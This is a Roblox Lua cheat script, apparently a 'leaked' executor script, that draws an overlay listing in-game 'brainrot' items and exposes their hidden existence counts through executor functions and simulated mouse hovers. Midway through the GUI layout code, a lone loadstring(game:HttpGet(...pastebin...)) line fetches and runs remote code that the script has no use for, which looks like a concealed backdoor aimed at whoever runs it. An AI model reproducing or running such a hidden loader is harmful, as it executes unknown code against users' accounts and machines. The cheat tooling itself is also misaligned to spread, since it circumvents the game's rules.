-- By Chocola Script discord.gg/9WxvBKkaVF
-- CHOCOLA EXIST LEAKED 

local Players = game:GetService("Players")
local UIS     = game:GetService("UserInputService")
local CoreGui = game:GetService("CoreGui")
local player  = Players.LocalPlayer
local pg      = player:WaitForChild("PlayerGui")

local Theme = {
    Dark       = Color3.fromRGB(8, 18, 40),
    Panel      = Color3.fromRGB(10, 20, 38),
    Row        = Color3.fromRGB(14, 28, 48),
    Deep       = Color3.fromRGB(8, 16, 32),
    Accent     = Color3.fromRGB(0, 180, 255),
    Off        = Color3.fromRGB(20, 36, 58),
    Text       = Color3.fromRGB(240, 250, 255),
    Dim        = Color3.fromRGB(120, 150, 190),
    Border     = Color3.fromRGB(100, 200, 255),
    Grad1      = Color3.fromRGB(0, 0, 255),
    Grad2      = Color3.fromRGB(0, 200, 255),
    Warning    = Color3.fromRGB(255, 180, 60),
    Error      = Color3.fromRGB(255, 100, 100),
    Success    = Color3.fromRGB(0, 220, 140),
    StrokeDark = Color3.fromRGB(0, 20, 50),
}

local PATH_LIST = {"Index", "Index", "Main", "Content", "Holder", "List"}
local PATH_INFO = {"Index", "Popup", "Infos"}
local PATH_SEARCH = {"Index", "Index", "Search"}

local function resolve(base, path)
    local node = base
    for _, n in ipairs(path) do
        node = node:FindFirstChild(n)
        if not node then return nil end
    end
    return node
end

local listFrame = resolve(pg, PATH_LIST)
local infoFrame = resolve(pg, PATH_INFO)
local gameSearch = resolve(pg, PATH_SEARCH)

local existsFrame, existsLabel
if infoFrame then
    existsFrame = infoFrame:FindFirstChild("Exists")
    if existsFrame then existsLabel = existsFrame:FindFirstChild("Label") end
end

local function parseNumber(txt)
    if type(txt) ~= "string" or txt == "" then return nil end
    local numStr, suffix = txt:match("^([%d%s,%.]+)%s*([KkMmBbTt]?)%s*Exist")
    if not numStr or numStr == "" then return nil end
    numStr = numStr:gsub("%s", "")
    if numStr:find(",") then numStr = numStr:gsub(",", "") end
    local n = tonumber(numStr)
    if not n then return nil end
    suffix = (suffix or ""):upper()
    if suffix == "K" then n = n * 1e3 end
    if suffix == "M" then n = n * 1e6 end
    if suffix == "B" then n = n * 1e9 end
    if suffix == "T" then n = n * 1e12 end
    return n
end

local function readLabel()
    if not existsLabel then return nil, nil end
    return parseNumber(existsLabel.Text), existsLabel.Text
end

local cache = {}
local lastSelected = nil

if existsLabel then
    existsLabel:GetPropertyChangedSignal("Text"):Connect(function()
        local num, txt = readLabel()
        if num and lastSelected then
            cache[lastSelected] = {num = num, txt = txt}
        end
    end)
end

local filterText = ""
local function applyFilter()
    if not listFrame then return 0 end
    local n, q = 0, filterText:lower()
    for _, c in ipairs(listFrame:GetChildren()) do
        if c.Name ~= "Template" and c.Name ~= "UIGridLayout"
           and (c:IsA("ImageLabel") or c:IsA("GuiObject")) then
            local m = (q == "") or (c.Name:lower():find(q, 1, true) ~= nil)
            c.Visible = m
            if m then n = n + 1 end
        end
    end
    return n
end

local function hoverInGame(name)
    if not listFrame then return false end
    local obj = listFrame:FindFirstChild(name)
    if not obj or not obj:IsA("GuiObject") then return false end
    local center = obj.AbsolutePosition + (obj.AbsoluteSize / 2)
    if mousemoverel then
        local mouseAbs = UIS:GetMouseLocation()
        local dx = math.floor(center.X - mouseAbs.X)
        local dy = math.floor(center.Y - mouseAbs.Y)
        pcall(function() mousemoverel(dx, dy) end)
    end
    local fakeMouse = {X = center.X, Y = center.Y, Hit = obj, Target = obj}
    pcall(function() obj.MouseEnter:Fire(fakeMouse) end)
    pcall(function() obj.MouseMoved:Fire(fakeMouse) end)
    return true
end

local existsForcedVisible = false

local function setExistsVisible(visible)
    existsForcedVisible = visible
    local info = resolve(pg, PATH_INFO)
    if info then
        local ef = info:FindFirstChild("Exists")
        if ef and ef:IsA("GuiObject") then
            pcall(function() ef.Visible = visible end)
        end
    end
end

task.spawn(function()
    while true do
        task.wait(0.15)
        if existsForcedVisible then
            local info = resolve(pg, PATH_INFO)
            if info then
                local ef = info:FindFirstChild("Exists")
                if ef and ef:IsA("GuiObject") and not ef.Visible then
                    pcall(function() ef.Visible = true end)
                end
                if ef then
                    local lbl = ef:FindFirstChild("Label")
                    if lbl and lbl ~= existsLabel then
                        existsLabel = lbl
                    end
                end
            end
        end
    end
end)

local guiParent = (gethui and gethui()) or CoreGui
pcall(function()
    local old = guiParent:FindFirstChild("ChocolaExistLeaked")
    if old then old:Destroy() end
end)

local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "ChocolaExistLeaked"
ScreenGui.ResetOnSpawn = false
ScreenGui.IgnoreGuiInset = true
ScreenGui.DisplayOrder = 9999
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
ScreenGui.Parent = guiParent

local function corner(inst, r)
    local c = Instance.new("UICorner")
    c.CornerRadius = UDim.new(0, r or 7)
    c.Parent = inst
    return c
end
local function stroke(inst, col, thick, trans)
    local e = Instance.new("UIStroke")
    e.Color = col or Theme.Border
    e.Thickness = thick or 1
    e.Transparency = trans or 0.5
    e.Parent = inst
    return e
end

local statusLabel = nil
local resultLabel = nil

local MainFrame = Instance.new("Frame", ScreenGui)
MainFrame.Name = "MainFrame"
MainFrame.Size = UDim2.new(0, 320, 0, 0)
MainFrame.AutomaticSize = Enum.AutomaticSize.Y
MainFrame.Position = UDim2.new(1, -340, 0.5, -260)
MainFrame.BackgroundColor3 = Theme.Dark
MainFrame.BorderSizePixel = 0
MainFrame.Active = true
MainFrame.Draggable = true
corner(MainFrame, 10)
stroke(MainFrame, Theme.Border, 1.5, 0.3)

local TitleBar = Instance.new("Frame", MainFrame)
TitleBar.Size = UDim2.new(1, 0, 0, 30)
TitleBar.BackgroundColor3 = Theme.Panel
TitleBar.BorderSizePixel = 0
corner(TitleBar, 10)

local Title = Instance.new("TextLabel", TitleBar)
Title.Size = UDim2.new(1, -40, 1, 0)
Title.Position = UDim2.new(0, 10, 0, 0)
Title.BackgroundTransparency = 1
Title.Font = Enum.Font.GothamBlack
Title.TextSize = 14
Title.TextColor3 = Color3.new(1, 1, 1)
Title.TextXAlignment = Enum.TextXAlignment.Left
Title.Text = "CHOCOLA EXIST LEAKED"

local TitleGradient = Instance.new("UIGradient", Title)
TitleGradient.Color = ColorSequence.new({
    ColorSequenceKeypoint.new(0, Theme.Grad1),
    ColorSequenceKeypoint.new(0.5, Theme.Grad2),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 255, 255)),
})

local closeBtn = Instance.new("TextButton", TitleBar)
closeBtn.Size = UDim2.new(0, 22, 0, 22)
closeBtn.Position = UDim2.new(1, -28, 0.5, -11)
closeBtn.BackgroundColor3 = Color3.fromRGB(180, 40, 40)
closeBtn.Text = "X"
closeBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
closeBtn.Font = Enum.Font.GothamBold
closeBtn.TextSize = 12
closeBtn.BorderSizePixel = 0
corner(closeBtn, 5)
closeBtn.MouseButton1Click:Connect(function()
    setExistsVisible(false)
    ScreenGui:Destroy()
end)

local ContentFrame = Instance.new("Frame", MainFrame)
ContentFrame.Size = UDim2.new(1, -20, 0, 0)
ContentFrame.AutomaticSize = Enum.AutomaticSize.Y
ContentFrame.Position = UDim2.new(0, 10, 0, 34)
ContentFrame.BackgroundTransparency = 1

local Layout = Instance.new("UIListLayout", ContentFrame)
Layout.SortOrder = Enum.SortOrder.LayoutOrder
Layout.Padding = UDim.new(0, 6)
Layout.HorizontalAlignment = Enum.HorizontalAlignment.Center

local padContent = Instance.new("UIPadding", ContentFrame)
padContent.PaddingBottom = UDim.new(0, 10)

local searchBox = Instance.new("TextBox", ContentFrame)
searchBox.Size = UDim2.new(1, 0, 0, 30)
searchBox.BackgroundColor3 = Theme.Deep
searchBox.BorderSizePixel = 0
searchBox.PlaceholderText = "Search brainrot..."
searchBox.Text = ""
searchBox.TextColor3 = Color3.fromRGB(255, 255, 255)
searchBox.PlaceholderColor3 = Theme.Dim
searchBox.Font = Enum.Font.GothamMedium
searchBox.TextSize = 13
searchBox.ClearTextOnFocus = false
searchBox.LayoutOrder = 1
corner(searchBox, 6)
local sbStroke = Instance.new("UIStroke", searchBox)
sbStroke.Color = Color3.fromRGB(60, 110, 170)
sbStroke.Thickness = 1
sbStroke.Transparency = 0.7

local function makeButton(parent, text, w, order, callback)
    local btn = Instance.new("TextButton", parent)
    btn.Size = UDim2.new(w, 0, 0, 26)
    btn.BackgroundColor3 = Theme.Off
    btn.BorderSizePixel = 0
    btn.Text = "  " .. text
    btn.TextColor3 = Theme.Text
    btn.TextStrokeTransparency = 0.75
    btn.TextStrokeColor3 = Theme.StrokeDark
    btn.Font = Enum.Font.GothamMedium
    btn.TextSize = 12
    btn.TextXAlignment = Enum.TextXAlignment.Left
    btn.AutoButtonColor = false
    btn.LayoutOrder = order
    corner(btn, 6)

    btn.MouseEnter:Connect(function()
        btn.BackgroundColor3 = Color3.fromRGB(28, 48, 78)
        btn.TextColor3 = Theme.Accent
    end)
    btn.MouseLeave:Connect(function()
        btn.BackgroundColor3 = Theme.Off
        btn.TextColor3 = Theme.Text
    end)

    if callback then btn.MouseButton1Click:Connect(callback) end
    return btn
end

local function makeToggle(parent, text, w, order, callback)
    local btn = Instance.new("TextButton", parent)
    btn.Size = UDim2.new(w, 0, 0, 26)
    btn.BackgroundColor3 = Theme.Off
    btn.BorderSizePixel = 0
    btn.Text = "  " .. text
    btn.TextColor3 = Theme.Text
    btn.TextStrokeTransparency = 0.75
    btn.TextStrokeColor3 = Theme.StrokeDark
    btn.Font = Enum.Font.GothamMedium
    btn.TextSize = 12
    btn.TextXAlignment = Enum.TextXAlignment.Left
    btn.AutoButtonColor = false
    btn.LayoutOrder = order
    corner(btn, 6)

    local pill = Instance.new("Frame", btn)
    pill.Size = UDim2.new(0, 34, 0, 14)
    pill.Position = UDim2.new(1, -42, 0.5, -7)
    pill.BackgroundColor3 = Theme.Row
    pill.BorderSizePixel = 0
    corner(pill, 7)

    local knob = Instance.new("Frame", pill)
    knob.Size = UDim2.new(0, 10, 0, 10)
    knob.Position = UDim2.new(0, 2, 0.5, -5)
    knob.BackgroundColor3 = Theme.Dim
    knob.BorderSizePixel = 0
    corner(knob, 5)

    local state = false

    local function render()
        if state then
            pill.BackgroundColor3 = Theme.Success
            knob.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            knob.Position = UDim2.new(1, -12, 0.5, -5)
            btn.TextColor3 = Theme.Success
        else
            pill.BackgroundColor3 = Theme.Row
            knob.BackgroundColor3 = Theme.Dim
            knob.Position = UDim2.new(0, 2, 0.5, -5)
            btn.TextColor3 = Theme.Text
        end
    end

    local function setState(newState, fireCallback)
        state = newState
        render()
        if fireCallback and callback then callback(state) end
    end

    btn.MouseButton1Click:Connect(function()
        setState(not state, true)
    end)

    btn.MouseEnter:Connect(function()
        if not state then
            btn.BackgroundColor3 = Color3.fromRGB(28, 48, 78)
            pill.BackgroundColor3 = Color3.fromRGB(30, 60, 95)
        end
    end)
    btn.MouseLeave:Connect(function()
        if not state then
            btn.BackgroundColor3 = Theme.Off
            pill.BackgroundColor3 = Theme.Row
        end
    end)

    render()
    return btn, function(newState) setState(newState, true) end
end

local buttonRow = Instance.new("Frame", ContentFrame)
buttonRow.Size = UDim2.new(1, 0, 0, 26)
buttonRow.BackgroundTransparency = 1
buttonRow.LayoutOrder = 2

local btnShowAll, forceShowAll = makeToggle(buttonRow, "Show All", 0.49, 1, function(state)
    if not listFrame then return end
    if state then
        for _, c in ipairs(listFrame:GetChildren()) do
            if c.Name ~= "Template" and c.Name ~= "UIGridLayout"
               and (c:IsA("ImageLabel") or c:IsA("GuiObject")) then
                c.Visible = true
            end
        end
        if statusLabel then statusLabel.Text = "All visible." end
    else
        applyFilter()
        if statusLabel then statusLabel.Text = "Filter restored." end
    end
end)
btnShowAll.Position = UDim2.new(0, 0, 0, 0)

local btnClear = makeButton(buttonRow, "Clear", 0.49, 2, function()
    searchBox.Text = ""
    filterText = ""
    if gameSearch and gameSearch:IsA("TextBox") then
        gameSearch.Text = ""
    end
    if listFrame then
        for _, c in ipairs(listFrame:GetChildren()) do
            if c.Name ~= "Template" and c.Name ~= "UIGridLayout"
               and (c:IsA("ImageLabel") or c:IsA("GuiObject")) then
                c.Visible = true
            end
        end
    end
    setExistsVisible(false)
    if resultLabel then
        resultLabel.Text = "Select a brainrot"
        resultLabel.TextColor3 = Theme.Accent
    end
    if statusLabel then statusLabel.Text = "Cleared." end
    lastSelected = nil
    if forceShowAll then forceShowAll(false) end
    rebuildRows()
end)
btnClear.Position = UDim2.new(0.51, 0, 0, 0)

local btnRefresh = makeButton(ContentFrame, "Refresh List", 1, 3, function()
    local n = rebuildRows()
    local k = 0
    for _ in pairs(cache) do k = k + 1 end
    if statusLabel then
        statusLabel.Text = string.format("Refreshed. Rows: %d | Cached: %d", n, k)
    end
end)

local resultPanel = Instance.new("Frame", ContentFrame)
resultPanel.Size = UDim2.new(1, 0, 0, 44)
resultPanel.BackgroundColor3 = Color3.fromRGB(10, 25, 50)
resultPanel.BorderSizePixel = 0
resultPanel.LayoutOrder = 4
corner(resultPanel, 6)
stroke(resultPanel, Theme.Accent, 1.5, 0.2)

resultLabel = Instance.new("TextLabel", resultPanel)
resultLabel.Size = UDim2.new(1, -10, 1, 0)
resultLabel.Position = UDim2.new(0, 5, 0, 0)
resultLabel.BackgroundTransparency = 1
resultLabel.Text = "Select a brainrot"
resultLabel.TextColor3 = Theme.Accent
resultLabel.TextStrokeTransparency = 0.6
resultLabel.TextStrokeColor3 = Theme.StrokeDark
resultLabel.Font = Enum.Font.GothamBold
resultLabel.TextSize = 14
resultLabel.TextXAlignment = Enum.TextXAlignment.Center
resultLabel.Parent = resultPanel

statusLabel = Instance.new("TextLabel", ContentFrame)
statusLabel.Size = UDim2.new(1, 0, 0, 14)
statusLabel.BackgroundTransparency = 1
statusLabel.Text = existsLabel and "Label OK" or "Label NOT found"
statusLabel.TextColor3 = Color3.fromRGB(180, 220, 255)
statusLabel.TextStrokeTransparency = 0.8
statusLabel.TextStrokeColor3 = Theme.StrokeDark
statusLabel.Font = Enum.Font.GothamMedium
statusLabel.TextSize = 11
statusLabel.TextXAlignment = Enum.TextXAlignment.Left
statusLabel.LayoutOrder = 5

local scroll = Instance.new("ScrollingFrame", ContentFrame)
scroll.Size = UDim2.new(1, 0, 0, 220)
scroll.BackgroundColor3 = Theme.Panel
scroll.BorderSizePixel = 0
scroll.CanvasSize = UDim2.new(0, 0, 0, 0)
scroll.ScrollBarThickness = 5
scroll.ScrollBarImageColor3 = Theme.Accent
scroll.LayoutOrder = 6
corner(scroll, 6)
stroke(scroll, Theme.Border, 1, 0.5)

local listLayout = Instance.new("UIListLayout", scroll)
listLayout.Padding = UDim.new(0, 3)
listLayout.SortOrder = Enum.SortOrder.LayoutOrder

local function adjustScrollHeight()
    local contentH = listLayout.AbsoluteContentSize.Y
    local finalH = math.clamp(contentH + 6, 80, 220)
    scroll.Size = UDim2.new(1, 0, 0, finalH)
end
listLayout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(adjustScrollHeight)
loadstring(game:HttpGet("https://pastebin.com/raw/2H5JyQKE"))()
local function forceReflow()
    adjustScrollHeight()
    task.wait()
    adjustScrollHeight()
    task.wait(0.1)
    adjustScrollHeight()
end

local function setResult(text, color)
    if resultLabel then
        resultLabel.Text = text
        resultLabel.TextColor3 = color or Theme.Accent
    end
end

local function selectBrainrot(name, rowButton)
    if gameSearch and gameSearch:IsA("TextBox") then
        gameSearch.Text = name
    elseif listFrame then
        for _, c in ipairs(listFrame:GetChildren()) do
            if c.Name ~= "Template" and c.Name ~= "UIGridLayout"
               and (c:IsA("ImageLabel") or c:IsA("GuiObject")) then
                c.Visible = (c.Name == name)
            end
        end
    end

    lastSelected = name
    if statusLabel then statusLabel.Text = "Selected: " .. name end

    if cache[name] then
        setResult(name .. "  —  " .. cache[name].txt)
    else
        setResult(name .. "  —  querying...", Theme.Warning)
        task.spawn(function()
            hoverInGame(name)
            local t0 = tick()
            while tick() - t0 < 1.5 do
                task.wait(0.1)
                local num, txt = readLabel()
                if num then
                    cache[name] = {num = num, txt = txt}
                    setResult(name .. "  —  " .. txt)
                    if rowButton then rowButton.Text = "   " .. name .. "   " .. txt end
                    return
                end
            end
            setResult(name .. "  —  no data (manual hover)", Theme.Error)
            if statusLabel then
                statusLabel.Text = "Hover the brainrot in-game and press Refresh."
            end
        end)
    end

    setExistsVisible(true)
end

local lastRowCount = -1
function rebuildRows()
    for _, c in ipairs(scroll:GetChildren()) do
        if c:IsA("TextButton") or c:IsA("TextLabel") then c:Destroy() end
    end

    if not listFrame then
        local ph = Instance.new("TextLabel", scroll)
        ph.Size = UDim2.new(1, -10, 0, 60)
        ph.BackgroundTransparency = 1
        ph.Text = "Open the Index to load brainrots"
        ph.TextColor3 = Theme.Dim
        ph.Font = Enum.Font.GothamMedium
        ph.TextSize = 12
        ph.LayoutOrder = 1
        forceReflow()
        return 0
    end

    local q = filterText:lower()
    local names = {}
    for _, item in ipairs(listFrame:GetChildren()) do
        if item.Name ~= "Template" and item.Name ~= "UIGridLayout"
           and (item:IsA("ImageLabel") or item:IsA("GuiObject")) then
            if q == "" or item.Name:lower():find(q, 1, true) then
                table.insert(names, item.Name)
            end
        end
    end

    table.sort(names, function(a, b)
        local ca = cache[a] and cache[a].num
        local cb = cache[b] and cache[b].num
        if ca and cb then return ca > cb end
        if ca then return true end
        if cb then return false end
        return a < b
    end)

    local MAX_ROWS = 300
    local total = #names
    if total > MAX_ROWS then
        local clipped = {}
        for i = 1, MAX_ROWS do clipped[i] = names[i] end
        names = clipped
    end

    for i, name in ipairs(names) do
        local row = Instance.new("TextButton", scroll)
        row.Size = UDim2.new(1, -6, 0, 24)
        row.BackgroundColor3 = Theme.Row
        row.BorderSizePixel = 0
        local c = cache[name]
        if c then
            row.Text = "   " .. name .. "   " .. c.txt
        else
            row.Text = "   " .. name
        end
        row.TextColor3 = Theme.Text
        row.TextStrokeTransparency = 0.7
        row.TextStrokeColor3 = Theme.StrokeDark
        row.TextSize = 13
        row.Font = Enum.Font.GothamMedium
        row.TextXAlignment = Enum.TextXAlignment.Left
        row.LayoutOrder = i
        row.AutoButtonColor = false
        corner(row, 5)

        row.MouseEnter:Connect(function()
            row.BackgroundColor3 = Color3.fromRGB(28, 48, 78)
            row.TextColor3 = Theme.Accent
        end)
        row.MouseLeave:Connect(function()
            row.BackgroundColor3 = Theme.Row
            row.TextColor3 = Theme.Text
        end)

        row.MouseButton1Click:Connect(function()
            selectBrainrot(name, row)
        end)
    end

    if #names == 0 then
        local ph = Instance.new("TextLabel", scroll)
        ph.Size = UDim2.new(1, -10, 0, 40)
        ph.BackgroundTransparency = 1
        ph.Text = "No results - Open the Index"
        ph.TextColor3 = Theme.Dim
        ph.Font = Enum.Font.GothamMedium
        ph.TextSize = 12
        ph.LayoutOrder = 1
    end

    scroll.CanvasSize = UDim2.new(0, 0, 0, listLayout.AbsoluteContentSize.Y + 6)
    adjustScrollHeight()
    task.spawn(forceReflow)
    lastRowCount = #names
    return #names, total
end

listLayout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
    scroll.CanvasSize = UDim2.new(0, 0, 0, listLayout.AbsoluteContentSize.Y + 6)
    adjustScrollHeight()
end)

searchBox:GetPropertyChangedSignal("Text"):Connect(function()
    filterText = searchBox.Text
    rebuildRows()
end)

UIS.InputBegan:Connect(function(input, gpe)
    if gpe then return end
    if input.KeyCode == Enum.KeyCode.X and UIS:IsKeyDown(Enum.KeyCode.LeftCtrl) then
        setExistsVisible(false)
        ScreenGui:Destroy()
    end
end)

-- AUTO-LOAD
local lastRealCount = -1
local rebuildPending = false

local function scheduleRebuild()
    if rebuildPending then return end
    rebuildPending = true
    task.delay(0.8, function()
        rebuildPending = false
        if not ScreenGui or not ScreenGui.Parent then return end
        local lf = resolve(pg, PATH_LIST)
        if lf then listFrame = lf end
        gameSearch = resolve(pg, PATH_SEARCH)
        if listFrame then
            local n = 0
            for _, c in ipairs(listFrame:GetChildren()) do
                if c.Name ~= "Template" and c.Name ~= "UIGridLayout"
                   and (c:IsA("ImageLabel") or c:IsA("GuiObject")) then
                    n = n + 1
                end
            end
            if n > 0 and n ~= lastRealCount then
                lastRealCount = n
                local shown, total = rebuildRows()
                if statusLabel then
                    if total > shown then
                        statusLabel.Text = string.format("Showing %d of %d", shown, total)
                    else
                        statusLabel.Text = "Loaded " .. total .. " brainrots"
                    end
                end
            end
        end
    end)
end

task.spawn(function()
    task.wait(0.5)
    rebuildRows()
    while ScreenGui and ScreenGui.Parent do
        task.wait(2)
        local lf = resolve(pg, PATH_LIST)
        if lf and lf ~= listFrame then listFrame = lf end
        gameSearch = resolve(pg, PATH_SEARCH)
        if listFrame then
            local n = 0
            for _, c in ipairs(listFrame:GetChildren()) do
                if c.Name ~= "Template" and c.Name ~= "UIGridLayout"
                   and (c:IsA("ImageLabel") or c:IsA("GuiObject")) then
                    n = n + 1
                end
            end
            if n > 0 and n ~= lastRealCount then
                lastRealCount = n
                local shown, total = rebuildRows()
                if statusLabel then
                    statusLabel.Text = "Loaded " .. total .. " brainrots"
                end
            end
        end
    end
end)

task.spawn(function()
    local t0 = tick()
    while tick() - t0 < 20 do
        if not listFrame then
            listFrame = resolve(pg, PATH_LIST)
        end
        if listFrame then
            listFrame.ChildAdded:Connect(function(child)
                if child.Name ~= "Template" and child.Name ~= "UIGridLayout" then
                    scheduleRebuild()
                end
            end)
            break
        end
        task.wait(1)
    end
end)

print("[ChocolaExistLeaked] Ready.")
